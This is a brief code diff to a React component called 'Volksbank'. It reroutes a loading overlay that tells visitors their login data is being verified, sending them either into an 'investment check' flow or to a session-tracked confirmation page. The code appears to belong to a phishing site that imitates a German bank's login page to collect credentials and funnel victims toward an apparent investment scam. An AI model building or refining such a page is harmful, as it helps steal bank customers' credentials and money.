@@ -27,7 +27,7 @@ const Volksbank = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate(fromInvestmentCheck ? "/investmentcheck/start?step=3" : "/confirmation?s=" + sessionId)} />}
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
